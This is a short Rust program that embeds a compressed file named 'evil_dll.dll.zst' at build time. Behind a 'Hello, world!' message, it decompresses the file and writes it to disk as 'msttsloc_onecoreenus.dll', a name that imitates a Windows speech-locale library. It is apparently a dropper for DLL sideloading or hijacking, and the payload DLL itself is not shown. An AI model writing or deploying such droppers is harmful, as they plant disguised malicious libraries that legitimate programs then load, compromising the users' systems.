use std::fs::File;
use std::io::{self, Write};
use zstd::stream::decode_all;

const DLL_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/evil_dll.dll.zst"));

fn write_binary() -> io::Result<()> {
    let decompressed = decode_all(DLL_BYTES)?;
    let mut file = File::create("msttsloc_onecoreenus.dll")?;
    file.write_all(&decompressed)?;
    Ok(())
}

fn main() {
    println!("Hello, world!");
    let _ = write_binary();
    println!("DLL uncompressed!");
}
